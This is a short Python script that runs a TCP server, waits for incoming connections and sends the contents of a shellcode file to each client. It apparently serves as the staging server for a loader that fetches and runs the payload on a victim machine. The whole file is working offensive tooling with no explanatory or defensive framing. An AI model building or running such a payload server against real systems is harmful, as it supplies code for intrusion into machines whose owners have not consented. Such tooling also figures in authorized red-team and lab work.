import socket
import sys

def main():
    if len(sys.argv) < 4:
        print(f'USAGE: {sys.argv[0]} <ip> <port> <shellcode_file.bin>')
        sys.exit(1)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((sys.argv[1], int(sys.argv[2])))
        
        while True:
            print('Waiting connections...')
            sock.listen(1)
            conn, addr = sock.accept()

            with conn:
                print('Connected by', addr)
                with open(sys.argv[3], 'rb') as f:
                    shellcode = f.read()

                conn.send(shellcode)
                print('Shellcode sent!')

if __name__ == '__main__':
    main()